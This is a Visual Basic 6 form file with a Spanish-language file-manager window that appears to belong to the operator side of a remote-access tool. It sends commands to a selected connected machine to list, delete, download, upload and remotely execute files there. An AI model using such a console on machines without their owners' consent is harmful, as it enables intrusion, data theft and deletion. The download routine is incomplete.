VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form Form3 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Administrador de Archivos"
   ClientHeight    =   7950
   ClientLeft      =   150
   ClientTop       =   795
   ClientWidth     =   12615
   BeginProperty Font 
      Name            =   "Palatino Linotype"
      Size            =   9.75
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7950
   ScaleWidth      =   12615
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CD 
      Left            =   120
      Top             =   7320
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Left            =   9240
      Top             =   4440
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "Palatino Linotype"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   4200
      TabIndex        =   3
      Top             =   100
      Width           =   8295
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00FFFFC0&
      BorderStyle     =   0  'None
      DrawStyle       =   5  'Transparent
      ForeColor       =   &H80000008&
      Height          =   240
      Left            =   3635
      Picture         =   "Administrador de Archivos.frx":0000
      ScaleHeight     =   240
      ScaleWidth      =   240
      TabIndex        =   2
      Top             =   150
      Width           =   240
   End
   Begin VB.ComboBox Combo1 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Palatino Linotype"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   120
      TabIndex        =   1
      Top             =   99
      Width           =   3495
   End
   Begin MSComctlLib.ListView LVA 
      Height          =   7215
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   12375
      _ExtentX        =   21828
      _ExtentY        =   12726
      View            =   3
      Arrange         =   1
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Documentos"
         Object.Width           =   16748
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Tamaño"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Atributos"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.Line Line1 
      X1              =   4020
      X2              =   4020
      Y1              =   0
      Y2              =   720
   End
   Begin VB.Menu OBJiniciar 
      Caption         =   "Iniciar"
      WindowList      =   -1  'True
   End
   Begin VB.Menu MnuArchivoR 
      Caption         =   "Archivo"
      Visible         =   0   'False
      Begin VB.Menu SmnuEliminarR 
         Caption         =   "Eliminar"
      End
      Begin VB.Menu Separador1R 
         Caption         =   "-"
      End
      Begin VB.Menu SmnuSubirArchivoR 
         Caption         =   "Subir Archivo"
      End
      Begin VB.Menu SmnuDescargarR 
         Caption         =   "Descargar Archivo"
      End
      Begin VB.Menu SmnuEjecutarR 
         Caption         =   "Ejecutar Archivo (Remoto)"
      End
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim B As String
Dim Atras As String
Dim LCB As Byte
Dim Pauta As String
Private Sub Form_Load()

Form1.Skin.ApplySkin Me.hWnd

End Sub

Private Sub Form_Unload(Cancel As Integer)

Form1.A = Form1.LV.SelectedItem.Index
B = "ARCHIVOS" & "#" & "TERMINADO"
Call Funciones.Comando(Form1.A, B)
End Sub

Private Sub LVA_DblClick()

On Error Resume Next


If LVA.SelectedItem.Text = "..." Then

If Len(Combo1.Text) = 3 Then
Exit Sub
End If
    
    Combo1.Text = Left(Combo1.Text, Len(Combo1.Text) - 1)
    Atras = Left(Combo1.Text, InStrRev(Combo1.Text, "\"))
    Combo1.Text = Atras
    
    Call Picture1_Click
    Exit Sub

End If

If LVA.SelectedItem.ListSubItems(1).Text = "CARPETA" Then
    Combo1.Text = Combo1.Text & LVA.SelectedItem.Text & "\"
    Call Picture1_Click
    
    Else
    Exit Sub
End If

End Sub


Private Sub LVA_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

On Error Resume Next
    If LVA.SelectedItem.Selected = False Then
        Exit Sub
        ElseIf Button = 2 Then
        PopupMenu MnuArchivoR, , x, y
    End If
    
End Sub

Private Sub OBJiniciar_Click()
Form1.A = Form1.LV.SelectedItem.Index
Form1.A = Val(Form1.A)

B = "ARCHIVOS" & "#" & "INICIADO"
Call Funciones.Comando(Form1.A, B)
MsgBox "Conectado Con Exito", vbInformation, "Administrador de Archivo"

End Sub

Private Sub Picture1_Click()

LCB = Len(Combo1.Text)

If LCB = 2 Then

Combo1.Text = Combo1.Text & "\"

    B = "ARCHIVOS" & "#" & "DIR" & "#" & Combo1.Text
    Call Funciones.Comando(Form1.A, B)
  
Exit Sub


End If

    B = "ARCHIVOS" & "#" & "DIR" & "#" & Combo1.Text
    Call Funciones.Comando(Form1.A, B)

If Combo1.Text = "" Then
MsgBox "Debe Seleccionar un Drive", vbInformation, "File Manager"
Exit Sub
End If

End Sub

Private Sub SmnuDescargarR_Click()


MsgBox Combo1.Text & LVA.SelectedItem.Text
Call Funciones.Comando(Form1.A, "TAMARCHI" & "#" & Combo1.Text & LVA.SelectedItem.Text)

Open App.Path & "\" & Form3.LVA.SelectedItem.Text For Binary As #1

End Sub

Private Sub SmnuEjecutarR_Click()

Call Funciones.Comando(Form1.A, "EJECUTE" & "#" & Form3.Combo1.Text & "\" & Form3.LVA.SelectedItem.Text)

End Sub

Private Sub SmnuEliminarR_Click()

Call Funciones.Comando(Form1.A, "KILL" & "#" & Form3.Combo1.Text & "\" & Form3.LVA.SelectedItem.Text)

End Sub

Private Sub SmnuSubirArchivoR_Click()
Form4.Show
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
If Combo1.Text = "" Then
Combo1.Text = Combo1.List(0)
End If

If Combo1.Text <> "" Then
Timer1.Enabled = False
End If

End Sub
